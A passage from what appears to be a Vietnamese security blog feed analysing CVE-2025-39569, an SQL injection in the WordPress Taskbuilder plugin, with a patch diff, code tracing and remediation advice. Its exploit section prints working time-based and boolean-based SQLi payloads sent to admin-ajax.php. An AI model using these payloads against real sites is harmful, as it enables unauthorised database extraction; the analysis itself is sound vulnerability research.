rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Taskbuilder Plugin&lt;/strong&gt;:  v4.0.1(vul) và v4.0.2(fix)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Ứng dụng đã &lt;strong&gt;xử lý dữ liệu đầu vào&lt;/strong&gt; trước khi đưa vào câu SQL. Tuy nhiên, trong quá trình xây dựng truy vấn, giá trị này được chèn trực tiếp mà không được bao trong dấu nháy đơn &lt;code&gt;&#39;...&#39;&lt;/code&gt;. Điều đó khiến kẻ tấn công có thể chèn thêm các thành phần cú pháp SQL hợp lệ (như &lt;code&gt;OR&lt;/code&gt;, &lt;code&gt;AND&lt;/code&gt;,&lt;code&gt;...&lt;/code&gt;) vào truy vấn, dẫn đến lỗ hổng SQL Injection.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá.&#xA;Có sự khác biệt rõ ở file &lt;strong&gt;includes/admin/projects/get_users.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Trong phiên bản &lt;strong&gt;v4.0.1&lt;/strong&gt;, biến &lt;code&gt;$proj_id&lt;/code&gt; sau khi escape được đưa thẳng vào câu truy vấn mà không có dấu nháy đơn bao quanh:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$proj_id = esc_sql($proj_id);&#xA;$project = $wpdb-&amp;gt;get_row( &amp;#34;SELECT * FROM {$wpdb-&amp;gt;prefix}wppm_project where id = $proj_id&amp;#34; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ở bản &lt;strong&gt;v4.0.2&lt;/strong&gt;, truy vấn đã được điều chỉnh bằng cách đặt &lt;code&gt;$proj_id&lt;/code&gt; trong dấu nháy đơn sau khi escape:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$proj_id = esc_sql($proj_id);&#xA;$project = $wpdb-&amp;gt;get_row( &amp;#34;SELECT * FROM {$wpdb-&amp;gt;prefix}wppm_project where id = &amp;#39;$proj_id&amp;#39;&amp;#34; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá này đảm bảo rằng giá trị &lt;code&gt;$proj_id&lt;/code&gt; sau khi escape được coi là &lt;strong&gt;một chuỗi literal&lt;/strong&gt;, không thể thoát ra khỏi dấu nháy đơn để chèn thêm cú pháp SQL, qua đó ngăn chặn tấn công SQL Injection.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-22-cve-2025-39569/patch_diff.png&#34;&#xA;    alt=&#34;patch diff&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Patch diff&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-work&#34;&gt;&lt;span&gt;How it work?&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-work&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;File architecture&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Cấu trúc chung của file hiện tại&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$proj_id  = esc_sql($proj_id);&#xA;$project  = $wpdb-&amp;gt;get_row(&amp;#34;SELECT * FROM {$wpdb-&amp;gt;prefix}wppm_project WHERE id = $proj_id&amp;#34;);&#xA;&#xA;// Bắt đầu buffer để tạo nội dung chính (body) của modal&#xA;ob_start();&#xA;// ... render HTML danh sách users&#xA;$body = ob_get_clean();&#xA;&#xA;// Bắt đầu buffer để tạo phần footer của modal&#xA;ob_start();&#xA;// ... render HTML các nút thao tác (Close, Save)&#xA;$footer = ob_get_clean();&#xA;&#xA;// Trả dữ liệu JSON để frontend hiển thị modal&#xA;echo json_encode([&#xA;    &amp;#39;body&amp;#39;   =&amp;gt; $body,&#xA;    &amp;#39;footer&amp;#39; =&amp;gt; $footer,&#xA;]);&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$proj_id&lt;/code&gt; / &lt;code&gt;$project&lt;/code&gt;: Lấy dữ liệu project từ database.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;ob_start()&lt;/code&gt; / &lt;code&gt;ob_get_clean()&lt;/code&gt;: Ghi HTML ra buffer thay vì xuất trực tiếp, giúp gom nội dung vào biến.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$body&lt;/code&gt; / &lt;code&gt;$footer&lt;/code&gt;: Chứa nội dung HTML động của modal.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;json_encode()&lt;/code&gt;: Trả JSON cho client, có khả năng được sử dụng trong Ajax để hiển thị modal mà không cần refresh trang.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;File nằm trong thư mục &lt;code&gt;includes&lt;/code&gt; cho thấy rằng nó sẽ được gọi ở 1 chức năng nào đó ở nơi khác. Để biết chức năng nào sử dụng nó, ta tìm kiếm với từ khóa &lt;code&gt;get_users.php&lt;/code&gt; trong thư mục chứa plugin.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-22-cve-2025-39569/search_get_users.png&#34;&#xA;    alt=&#34;search get users&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Search users&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 Nó được include trong hàm &lt;code&gt;wppm_get_users()&lt;/code&gt; của class &lt;code&gt;WPPM_Admin&lt;/code&gt; trong file &lt;strong&gt;class-wppm-admin.php&lt;/strong&gt;.&#xA;&lt;code&gt;wppm_get_users()&lt;/code&gt; là &lt;strong&gt;callback&lt;/strong&gt; của &lt;strong&gt;action hook trong WordPress&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;WPPM_Admin construct&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;final class WPPM_Admin {&#xA;    // constructor&#xA;    public function __construct() {&#xA;&#xA;        // other action&#xA;&#xA;        add_action( &amp;#39;wp_ajax_wppm_get_users&amp;#39;,array($this,&amp;#39;wppm_get_users&amp;#39;));&#xA;&#xA;        // array($this,&amp;#39;wppm_get_users&amp;#39;)) = $this::wppm_get_users()&#xA;        // other action&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;add_action()&lt;/code&gt; là một &lt;strong&gt;Plugin API&lt;/strong&gt; của WordPress, cho phép gắn một &lt;strong&gt;callback&lt;/strong&gt; vào một &lt;strong&gt;action hook&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;wp_ajax_wppm_get_users&lt;/code&gt; là tên hook Ajax, với quy tắc đặt tên:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_{action}&lt;/code&gt; =&amp;gt; Xử lý Ajax khi user đã đăng nhập.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_{action}&lt;/code&gt; =&amp;gt; Xử lý Ajax khi user chưa đăng nhập.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Ở đây, &lt;code&gt;action = wppm_get_users&lt;/code&gt;. Nghĩa là nếu trong Ajax request bạn gửi &lt;code&gt;action=wppm_get_users&lt;/code&gt; tới &lt;code&gt;admin-ajax.php&lt;/code&gt;, thì WordPress sẽ &lt;strong&gt;tìm callback tương ứng để xử lý&lt;/strong&gt;, ở đây là &lt;code&gt;wppm_get_users()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;👉 Ta đã biết được &lt;code&gt;action = wppm_get_users&lt;/code&gt;, kiểm tra xem Ajax nào sử dụng action này bằng cách tìm từ khóa &lt;code&gt;wppm_get_users&lt;/code&gt; trên các file &lt;strong&gt;.js&lt;/strong&gt; trong thư mục chứa plugin.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-22-cve-2025-39569/ajax_search.png&#34;&#xA;    alt=&#34;ajax search&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Ajax search&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Action &lt;code&gt;wppm_get_users&lt;/code&gt; là phần data trong request POST của hàm &lt;code&gt;wppm_get_users()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Hàm &lt;code&gt;wppm_get_users()&lt;/code&gt; sẽ được đặt trong HTML attribute của &lt;strong&gt;chức năng project&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Tạo project mới&lt;/li&gt;&#xA;&lt;li&gt;Truy cập vào project đó&lt;/li&gt;&#xA;&lt;li&gt;Inspect code và tìm hàm &lt;code&gt;wppm_get_users&lt;/code&gt; sẽ được đặt ở đâu, hành động nào sẽ gọi nó&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-22-cve-2025-39569/ajax_inspect.png&#34;&#xA;    alt=&#34;ajax inspect&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Ajax inspect&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 Khi click vào &lt;strong&gt;icon bên cạnh Users&lt;/strong&gt; ajax sẽ hoạt động, gửi request đến server, lấy danh sách các user tham gia project và mã HTML hiển thị nó.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-22-cve-2025-39569/model_display.png&#34;&#xA;    alt=&#34;model display&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Model display&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-sqli&#34;&gt;&lt;span&gt;Detect SQLi&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-sqli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Bắt request bằng BurpSuite, gửi request với SQLi payload &lt;strong&gt;time base&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;...&#xA;action=wppm_get_users&amp;amp;proj_id=(SELECT&amp;#43;SLEEP(1))&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-22-cve-2025-39569/sqli_success.png&#34;&#xA;    alt=&#34;sqli success&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Sqli success&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Thời gian phản hồi bị delay =&amp;gt; SQL Injection thành công.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;get-first-letter-of-database-name&#34;&gt;&lt;span&gt;Get First Letter of Database Name&lt;/span&gt;&#xA;  &lt;a href=&#34;#get-first-letter-of-database-name&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Điều kiện tiên quyết để &lt;strong&gt;dump được hết data&lt;/strong&gt; là phải dump được 1 ký tự bất kỳ của tên database, nếu lấy được thì toàn bộ data đều dump được.&lt;/p&gt;&#xA;&lt;p&gt;Gửi request với SQLi payload &lt;strong&gt;boolean base&lt;/strong&gt; vói &lt;code&gt;proj_id&lt;/code&gt; đúng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;...&#xA;action=wppm_get_users&amp;amp;proj_id=(SELECT&amp;#43;IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999))&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;Database name được tôi đặt tên là &lt;strong&gt;wordpress&lt;/strong&gt; nên kí tự đầu tiên là &lt;code&gt;w&lt;/code&gt; tương ứng với mã HEX là &lt;code&gt;0x77&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;Sử dụng &lt;code&gt;SUBSTRING(STRING,1,1)&lt;/code&gt; để lấy kí tự đầu tiên của chuỗi&lt;/p&gt;&#xA;&lt;p&gt;Ở đây, &lt;code&gt;$proj_id&lt;/code&gt; bằng &lt;code&gt;4&lt;/code&gt; vì &lt;code&gt;SUBSTRING(&#39;wordpress&#39;,1,1)=0x77&lt;/code&gt; là đúng nên &lt;code&gt;SELECT&lt;/code&gt; lấy giá trị đúng trong &lt;code&gt;IF(condition, value if true, value if false)&lt;/code&gt;, &lt;code&gt;4&lt;/code&gt; là giá trị có thực trong database, nên response trả về chứa danh sách người tham gia dự án&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-22-cve-2025-39569/res.png&#34;&#xA;    alt=&#34;response 1&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Res 1&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Sử dụng &lt;strong&gt;HEX technique&lt;/strong&gt; để bypass hàm &lt;code&gt;esc_sql()&lt;/code&gt; &lt;a href=&#34;#patch-diff&#34;&gt;ở trên&lt;/a&gt;, dùng để so sánh khi không sử dùng được &lt;code&gt;&#39;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Gửi request với SQLi payload &lt;strong&gt;boolean base&lt;/strong&gt; vói &lt;code&gt;proj_id&lt;/code&gt; sai:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;...&#xA;action=wppm_get_users&amp;amp;proj_id=(SELECT&amp;#43;IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4))&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Với &lt;code&gt;proj_id&lt;/code&gt; không có thực trong database, response sẽ trả về kết quả chứa &lt;code&gt;None&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-22-cve-2025-39569/res_none.png&#34;&#xA;    alt=&#34;response 2&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Res 2&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 Ta đã lấy được kí tự đầu tiên của database name bằng kỹ thuật &lt;strong&gt;boolean base&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;proj_id&lt;/code&gt; đùng: response không chứa None&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;proj_id&lt;/code&gt; sai: response chứa None&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Có thể sử dụng kỹ thuật &lt;strong&gt;time base&lt;/strong&gt; nhưng khi dump số lượng lớn data, thời gian dump sẽ rất lâu&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2025-39569&lt;/strong&gt; trong plugin &lt;strong&gt;WordPress Taskbuilder&lt;/strong&gt; xuất phát từ việc thiếu dấu nháy đơn &lt;code&gt;&#39;...&#39;&lt;/code&gt; bao quanh dữ liệu đầu vào trong câu lệnh SQL, khiến dữ liệu người dùng có thể được diễn giải như một phần của câu lệnh SQL hợp lệ.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá ở phiên bản &lt;strong&gt;4.0.2&lt;/strong&gt; đã khắc phục vấn đề bằng cách đưa &lt;code&gt;$proj_id&lt;/code&gt; vào trong &lt;code&gt;&#39;...&#39;&lt;/code&gt;, đảm bảo nó luôn được xử lý như một literal string trong SQL.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Ưu tiên sử dụng &lt;strong&gt;prepared statements&lt;/strong&gt; (&lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; trong WordPress) thay vì tự chèn dữ liệu vào query.&lt;/li&gt;&#xA;&lt;li&gt;Đối với các plugin WordPress, cần test kỹ lưỡng &lt;strong&gt;các Ajax endpoint&lt;/strong&gt; vì đây là nơi dễ xuất hiện SQLi và XSS nhất.&lt;/li&gt;&#xA;&lt;li&gt;Người quản trị cần thường xuyên cập nhật plugin/theme để nhận bản vá kịp thời.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection cheat sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/taskbuilder/vulnerability/wordpress-taskbuilder-4-0-1-sql-injection-vulnerability?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Taskbuilder project mnagement tool Plugin &amp;lt;= 4.0.1 is vulnerable to SQL Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-39566 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-09-21-cve-2025-39566/</link>
      <pubDate>Sun, 21 Sep 2025 22:27:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-09-21-cve-2025-39566/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
